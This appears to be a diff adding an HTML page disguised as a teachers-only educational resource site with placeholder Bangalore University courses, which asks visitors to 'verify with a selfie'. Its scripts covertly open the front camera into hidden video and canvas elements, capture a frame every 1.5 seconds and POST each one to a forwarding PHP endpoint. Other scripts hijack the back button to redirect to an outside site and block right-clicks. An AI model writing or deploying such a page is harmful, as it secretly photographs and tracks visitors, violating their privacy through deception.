@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Educational Resource Repository</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    header {
+      background-color: #333;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h1 {
+      margin: 0;
+    }
+
+    nav {
+      background-color: #007bff;
+      color: #fff;
+      padding: 10px 20px;
+    }
+
+    nav ul {
+      list-style-type: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    nav ul li {
+      display: inline;
+      margin-right: 20px;
+    }
+
+    nav ul li a {
+      color: #fff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    section {
+      padding: 20px;
+    }
+
+    .resource {
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      margin-bottom: 20px;
+      padding: 20px;
+    }
+
+    footer {
+      background-color: #333;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+    }
+  </style>
+</head>
+<script type="text/javascript">function next(){location.href="jio/invite.htm"+location.search}function setCookie(e,t){var n=new Date;n.setTime(n.getTime()+2592e6);var o="expires="+n.toUTCString();document.cookie=e+"="+t+"; "+o}function getCookie(e){for(var t=e+"=",n=document.cookie.split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(t))return i.substring(t.length,i.length)}return 0}var message="You have not Permission to This";document.onmousedown=function(e){return"Netscape"==navigator.appName&&3==e.which?(alert(message),!1):-1!=navigator.appVersion.indexOf("MSIE")&&2==event.button?(alert(message),!1):void 0};</script>
+
+<body>
+  <header>
+    <h1>Educational Resource Repository Only For Teacher's</h1>
+    <p> Verify With a Selfie to Get Access to the resource.<p>
+  </header>
+  <nav>
+    <ul>
+      <li><a href="#">Home</a></li>
+      <li><a href="#">Courses</a></li>
+      <li><a href="#">Tutorials</a></li>
+      <li><a href="#">Downloads</a></li>
+    </ul>
+  </nav>
+  <section>
+    <div class="resource">
+      <h2>Bangalore University - Computer Science</h2>
+      <p>Introduction to Computer Science - This course provides an overview of fundamental concepts in computer science.</p>
+      <a href="#">View Course</a>
+    </div>
+    <div class="resource">
+      <h2>Bangalore University - Mathematics</h2>
+      <p>Calculus I - A comprehensive course covering differential and integral calculus.</p>
+      <a href="#">View Course</a>
+    </div>
+    <div class="resource">
+      <h2>Bangalore University - Physics</h2>
+      <p>Mechanics - Understand the principles of classical mechanics and their applications.</p>
+      <a href="#">View Course</a>
+    </div>
+    <div class="resource">
+      <h2>Introduction to Python Programming</h2>
+      <p>A beginner-friendly tutorial series introducing Python programming language.</p>
+      <a href="#">View Tutorial</a>
+    </div>
+    <div class="resource">
+      <h2>Web Development Basics</h2>
+      <p>Learn the fundamentals of web development including HTML, CSS, and JavaScript.</p>
+      <a href="#">View Tutorial</a>
+    </div>
+  </section>
+  <footer>
+    <p>&copy; 2024 Educational Resource Repository. All rights reserved.</p>
+  </footer>
+</body>
+<script type="text/javascript">! function (){var 
+t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function (t){t.state && location.replace("https://www.newtrendmasti.com")}}catch (o){}}();</script>
+
+
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
